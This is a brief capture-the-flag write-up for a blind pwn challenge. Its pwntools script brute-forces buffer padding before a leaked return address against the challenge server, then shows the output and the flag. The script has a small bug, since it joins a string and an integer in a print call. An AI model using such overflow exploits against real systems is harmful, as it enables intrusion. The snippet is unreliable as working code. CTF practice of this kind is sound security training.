# Warmup To The Darkside

Blind pwn challenge where they give us the address to exploit

Payload:

```
from pwn import *
import time

for i in range(1,100):
 print("Padding: " + i)
 r = remote('0.cloud.chals.io', '30096')
 r.recvuntil(b"at: ")
 add = r.recvline().decode("utf-8")
 payload = b'A' * i
 payload = payload + p64(int(add, base=16))
 r.sendline(payload)
 print(r.recvall(timeout=1).decode("utf-8"))
 r.close()
 time.sleep(1)
```

> Padding: 40
> [+] Opening connection to 0.cloud.chals.io on port 30096: Done
[+] Receiving all data: Done (95B)
[*] Closed connection to 0.cloud.chals.io port 30096
Jedi Mind tricks dont work on me >>>
shctf{I_will_remov3_th3s3_restraints_and_leave_the_c3ll}

## Flag

> shctf{I_will_remov3_th3s3_restraints_and_leave_the_c3ll}